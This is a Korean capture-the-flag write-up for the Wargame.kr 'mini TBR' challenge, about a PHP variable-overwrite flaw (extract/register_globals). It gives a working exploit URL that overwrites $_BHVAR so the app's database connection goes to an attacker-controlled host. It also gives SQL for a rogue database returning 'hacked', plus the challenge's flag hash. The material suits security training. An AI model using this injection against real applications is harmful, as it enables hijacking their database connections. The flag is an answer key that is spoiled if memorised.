# [Wargame.kr] mini TBR - Writeup

`extract` 함수 혹은 `register_globals` 기능으로 생기는 변수 조작의 취약점을 이용한 문제다.

`$_BHVAR` 변수를 조작해서 데이터베이스 설정이 담겨있는 `database.php` 파일을 `include`하지 못하게 하고,

SQL 연결 및 질의를 내가 지정한 임의의 서버로 오게하여 `$row['path']`를 "hacked"으로 되게 해주면 된다.

포트포워딩과 방화벽 설정 때문에 문제가 좀 있었지만 그거만 빼면 점수에 맞지 않는 쉬운 문제였다.

``` sql
CREATE TABLE `_bh_layout` (
  `path` varchar(15) NOT NULL,
  `layout_name` varchar(15) NOT NULL,
  `position` varchar(15) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `_bh_layout` (`path`, `layout_name`, `position`) VALUES
('hacked', '123', 'head');
```

[http://wargame.kr:8080/mini_TBR/?_type=P&_act=home&_BHVAR[path_layout]=./layouts/&_BHVAR[path_lib]=x./lib/&_BHVAR[path_module]=./modules/&_BHVAR[path_page]=./pages/&_BHVAR[path_tmp]=./tmp/&_BHVAR[db][host]=<MY_IP>&_BHVAR[db][user]=mini_tbr&_BHVAR[db][pass]=mini_tbr_pz&_BHVAR[db][name]=mini_tbr](http://wargame.kr:8080/mini_TBR/?_type=P&_act=home&_BHVAR[path_layout]=./layouts/&_BHVAR[path_lib]=x./lib/&_BHVAR[path_module]=./modules/&_BHVAR[path_page]=./pages/&_BHVAR[path_tmp]=./tmp/&_BHVAR[db][host]=<MY_IP>&_BHVAR[db][user]=mini_tbr&_BHVAR[db][pass]=mini_tbr_pz&_BHVAR[db][name]=mini_tbr)
```
50fe9f64b1840cebffc972fa2a92e3104d626c59
```

___

## Answer

flag: `50fe9f64b1840cebffc972fa2a92e3104d626c59`